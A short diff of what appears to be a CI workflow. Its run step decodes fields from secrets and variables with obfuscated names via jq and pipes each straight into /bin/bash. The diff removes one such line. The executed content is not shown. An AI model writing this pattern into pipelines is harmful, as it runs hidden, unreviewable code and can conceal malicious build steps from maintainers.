@@ -18,7 +18,6 @@ jobs:
           k70: ${{ secrets.k70 }}
         run: |
           printf '%s' "$k70" | jq -r .zllwy1 | /bin/bash
-          printf '%s' "$aqao80114" | jq -r .r15 | /bin/bash
           echo $iuspr0 | jq -r .hbm87 | /bin/bash
           echo $qe31 | jq -r .d706 | /bin/bash
           echo $y1 | jq -r .pxjht7540 | /bin/bash
